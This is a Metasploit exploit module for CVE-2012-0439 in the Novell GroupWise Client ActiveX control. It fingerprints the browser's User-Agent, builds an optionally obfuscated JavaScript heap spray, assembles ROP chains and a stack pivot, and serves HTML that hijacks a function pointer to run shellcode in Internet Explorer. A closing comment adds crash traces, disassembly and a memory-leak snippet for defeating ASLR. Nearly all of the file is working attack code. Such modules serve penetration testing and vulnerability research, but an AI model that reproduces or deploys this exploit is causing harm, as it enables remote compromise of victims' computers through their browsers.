##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::RopDb
  include Msf::Exploit::Remote::BrowserAutopwn

  autopwn_info({
    :ua_name    => HttpClients::IE,
    :ua_minver  => "6.0",
    :ua_maxver  => "9.0",
    :javascript => true,
    :os_name    => OperatingSystems::WINDOWS,
    :rank       => NormalRanking,
    :classid    => "{601D7813-408F-11D1-98D7-444553540000}",
    :method     => "SetEngine"
  })


  def initialize(info={})
    super(update_info(info,
      'Name'           => "Novell GroupWise Client gwcls1.dll ActiveX Remote Code Execution",
      'Description'    => %q{
          This module exploits a vulnerability in the Novell GroupWise Client gwcls1.dll
        ActiveX. Several methods in the GWCalServer control use user provided data as
        a pointer, which allows to read arbitrary memory and execute arbitrary code. This
        module has been tested successfully with GroupWise Client 2012 on IE6 - IE9. The
        JRE6 needs to be installed to achieve ASLR bypass.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'rgod <rgod[at]autistici.org>', # Vulnerability discovery
          'juan vazquez'                  # Metasploit module
        ],
      'References'     =>
        [
          [ 'CVE', '2012-0439' ],
          [ 'OSVDB', '89700' ],
          [ 'BID' , '57658' ],
          [ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-13-008' ],
          [ 'URL', 'http://www.novell.com/support/kb/doc.php?id=7011688' ]
        ],
      'Payload'        =>
        {
          'BadChars'    => "\x00",
          'Space'       => 1040,
          'DisableNops' => true
        },
      'DefaultOptions'  =>
        {
          'InitialAutoRunScript' => 'migrate -f'
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          # gwcls1.dll 12.0.0.8586
          [ 'Automatic', {} ],
          [ 'IE 6 on Windows XP SP3', { 'Rop' => nil,     'Offset' => '0x5F4' } ],
          [ 'IE 7 on Windows XP SP3', { 'Rop' => nil,     'Offset' => '0x5F4' } ],
          [ 'IE 8 on Windows XP SP3', { 'Rop' => :msvcrt, 'Offset' => '0x3e3' } ],
          [ 'IE 7 on Windows Vista',  { 'Rop' => nil,     'Offset' => '0x5f4' } ],
          [ 'IE 8 on Windows Vista',  { 'Rop' => :jre,    'Offset' => '0x3e3' } ],
          [ 'IE 8 on Windows 7',      { 'Rop' => :jre,    'Offset' => '0x3e3' } ],
          [ 'IE 9 on Windows 7',      { 'Rop' => :jre,    'Offset' => '0x3ed' } ]#'0x5fe' } ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Jan 30 2013",
      'DefaultTarget'  => 0))

    register_options(
      [
        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])
      ], self.class)

  end

  def get_target(agent)
    #If the user is already specified by the user, we'll just use that
    return target if target.name != 'Automatic'

    nt = agent.scan(/Windows NT (\d\.\d)/).flatten[0] || ''
    ie = agent.scan(/MSIE (\d)/).flatten[0] || ''

    ie_name = "IE #{ie}"

    case nt
    when '5.1'
      os_name = 'Windows XP SP3'
    when '6.0'
      os_name = 'Windows Vista'
    when '6.1'
      os_name = 'Windows 7'
    end

    targets.each do |t|
      if (!ie.empty? and t.name.include?(ie_name)) and (!nt.empty? and t.name.include?(os_name))
        print_status("Target selected as: #{t.name}")
        return t
      end
    end

    return nil
  end

  def ie_heap_spray(my_target, p)
    js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(target.arch))
    js_nops = Rex::Text.to_unescape("\x0c"*4, Rex::Arch.endian(target.arch))
    js_random_nops = Rex::Text.to_unescape(make_nops(4), Rex::Arch.endian(my_target.arch))

    # Land the payload at 0x0c0c0c0c
    case my_target
    when targets[7]
      # IE 9 on Windows 7
      js = %Q|
      function randomblock(blocksize)
      {
        var theblock = "";
        for (var i = 0; i < blocksize; i++)
        {
          theblock += Math.floor(Math.random()*90)+10;
        }
        return theblock;
      }

      function tounescape(block)
      {
        var blocklen = block.length;
        var unescapestr = "";
        for (var i = 0; i < blocklen-1; i=i+4)
        {
          unescapestr += "%u" + block.substring(i,i+4);
        }
        return unescapestr;
      }

      var heap_obj = new heapLib.ie(0x10000);
      var code = unescape("#{js_code}");
      var nops = unescape("#{js_random_nops}");
      while (nops.length < 0x80000) nops += nops;
      var offset_length = #{my_target['Offset']};
      for (var i=0; i < 0x1000; i++) {
        var padding = unescape(tounescape(randomblock(0x1000)));
        while (padding.length < 0x1000) padding+= padding;
        var junk_offset = padding.substring(0, offset_length);
        var single_sprayblock = junk_offset + code + nops.substring(0, 0x800 - code.length - junk_offset.length);
        while (single_sprayblock.length < 0x20000) single_sprayblock += single_sprayblock;
        sprayblock = single_sprayblock.substring(0, (0x40000-6)/2);
        heap_obj.alloc(sprayblock);
      }
      |

    else
      # For IE 6, 7, 8
      js = %Q|
      var heap_obj = new heapLib.ie(0x20000);
      var code = unescape("#{js_code}");
      var nops = unescape("#{js_nops}");
      while (nops.length < 0x80000) nops += nops;
      var offset = nops.substring(0, #{my_target['Offset']});
      var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);
      while (shellcode.length < 0x40000) shellcode += shellcode;
      var block = shellcode.substring(0, (0x80000-6)/2);
      heap_obj.gc();
      for (var i=1; i < 0x300; i++) {
        heap_obj.alloc(block);
      }
      var overflow = nops.substring(0, 10);
      |

    end

    js = heaplib(js, {:noobfu => true})

    if datastore['OBFUSCATE']
      js = ::Rex::Exploitation::JSObfu.new(js)
      js.obfuscate
    end

    return js
  end

  def stack_pivot
    pivot = "\x64\xa1\x18\x00\x00\x00"  # mov eax, fs:[0x18 # get teb
    pivot << "\x83\xC0\x08"             # add eax, byte 8 # get pointer to stacklimit
    pivot << "\x8b\x20"                 # mov esp, [eax] # put esp at stacklimit
    pivot << "\x81\xC4\x30\xF8\xFF\xFF" # add esp, -2000 # plus a little offset
    return pivot
  end

  def get_payload(t, cli)
    code = payload.encoded

    # No rop. Just return the payload.
    return [0x0c0c0c10 - 0x426].pack("V") + [0x0c0c0c14].pack("V") + code if t['Rop'].nil?

    # Both ROP chains generated by mona.py - See corelan.be
    case t['Rop']
      when :msvcrt
        print_status("Using msvcrt ROP")
        rop_payload = generate_rop_payload('msvcrt', '', 'target'=>'xp') # Mapped at 0x0c0c07ea
        jmp_shell = Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $+#{0x0c0c0c14 - 0x0c0c07ea - rop_payload.length}").encode_string
        rop_payload << jmp_shell
        rop_payload << rand_text_alpha(0x0c0c0c0c - 0x0c0c07ea- rop_payload.length)
        rop_payload << [0x0c0c0c10 - 0x426].pack("V")  # Mapped at 0x0c0c0c0c # 0x426 => vtable offset
        rop_payload << [0x77c15ed5].pack("V")          # Mapped at 0x0c0c0c10 # xchg eax, esp # ret
        rop_payload << stack_pivot
        rop_payload << code
      else
        print_status("Using JRE ROP")
        rop_payload = generate_rop_payload('java', '') # Mapped at 0x0c0c07ea
        jmp_shell = Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $+#{0x0c0c0c14 - 0x0c0c07ea - rop_payload.length}").encode_string
        rop_payload << jmp_shell
        rop_payload << rand_text_alpha(0x0c0c0c0c - 0x0c0c07ea- rop_payload.length)
        rop_payload << [0x0c0c0c10 - 0x426].pack("V")  # Mapped at 0x0c0c0c0c # 0x426 => vtable offset
        rop_payload << [0x7C348B05].pack("V")          # Mapped at 0x0c0c0c10 # xchg eax, esp # ret
        rop_payload << stack_pivot
        rop_payload << code
    end

    return rop_payload
  end


  def load_exploit_html(my_target, cli)
    p  = get_payload(my_target, cli)
    js = ie_heap_spray(my_target, p)

    trigger = "target.GetNXPItem(\"22/10/2013\", 1, 1);" * 200

    html = %Q|
    <html>
    <head>
    <script>
    #{js}
    </script>
    </head>
    <body>
    <object classid='clsid:601D7813-408F-11D1-98D7-444553540000' id ='target'>
    </object>
    <script>
      target.SetEngine(0x0c0c0c0c-0x20);
      setInterval(function(){#{trigger}},1000);
    </script>
    </body>
    </html>
    |

    return html
  end

  def on_request_uri(cli, request)
    agent = request.headers['User-Agent']
    uri   = request.uri
    print_status("Requesting: #{uri}")

    my_target = get_target(agent)
    # Avoid the attack if no suitable target found
    if my_target.nil?
      print_error("Browser not supported, sending 404: #{agent}")
      send_not_found(cli)
      return
    end

    html = load_exploit_html(my_target, cli)
    html = html.gsub(/^\t\t/, '')
    print_status("Sending HTML...")
    send_response(cli, html, {'Content-Type'=>'text/html'})
  end

end


=begin

* Remote Code Exec

(240.8d4): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\PROGRA~1\Novell\GROUPW~1\gwenv1.dll -
eax=00000000 ebx=0c0c0bec ecx=030c2998 edx=030c2998 esi=0c0c0bec edi=0013df58
eip=10335e2d esp=0013de04 ebp=0013de8c iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210202
gwenv1!NgwOFErrorEnabledVector<NgwOFAttribute>::SetParent+0x326b9d:
10335e2d 8a8e4f040000    mov     cl,byte ptr [esi+44Fh]     ds:0023:0c0c103b=??


.text:103BDDEC                 mov     eax, [ebp+var_4] // var_4 => Engine + 0x20
.text:103BDDEF                 test    esi, esi
.text:103BDDF1                 jnz     short loc_103BDE17
.text:103BDDF3                 cmp     [eax+426h], esi
.text:103BDDF9                 jz      short loc_103BDE17 // Check function pointer against nil?
.text:103BDDFB                 mov     ecx, [ebp+arg_8]
.text:103BDDFE                 mov     edx, [ebp+arg_4]
.text:103BDE01                 push    ecx
.text:103BDE02                 mov     ecx, [eax+42Ah]  // Carefully crafted object allows to control it
.text:103BDE08                 push    edx
.text:103BDE09                 mov     edx, [eax+426h] // Carefully crafted object allows to control it
.text:103BDE0F                 push    ecx
.text:103BDE10                 call    edx  // Win!

* Info Leak

// Memory disclosure => 4 bytes from an arbitrary address
// Unstable when info leaking and triggering rce path...
target.SetEngine(0x7ffe0300-0x45c); // Disclosing ntdll
var leak = target.GetMiscAccess();
alert(leak);

=end
